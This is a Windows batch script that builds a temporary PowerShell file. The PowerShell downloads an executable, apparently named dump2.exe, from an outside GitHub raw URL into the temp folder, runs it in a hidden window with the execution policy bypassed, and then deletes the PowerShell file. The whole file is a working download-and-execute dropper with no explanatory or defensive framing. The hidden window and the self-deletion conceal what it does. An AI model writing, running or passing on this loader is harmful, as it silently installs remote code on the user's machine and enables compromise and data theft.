@echo off
set "ps_script=$url5 = 'https://github.com/cia168168/folder/raw/main/dump2.exe'; $output5 = '%TEMP%\dump.exe'; Invoke-WebRequest -Uri $url5 -OutFile $output5; Start-Process -FilePath $output5 -WindowStyle Hidden"

echo %ps_script% > script.ps1

powershell -ExecutionPolicy Bypass -File script.ps1

del script.ps1
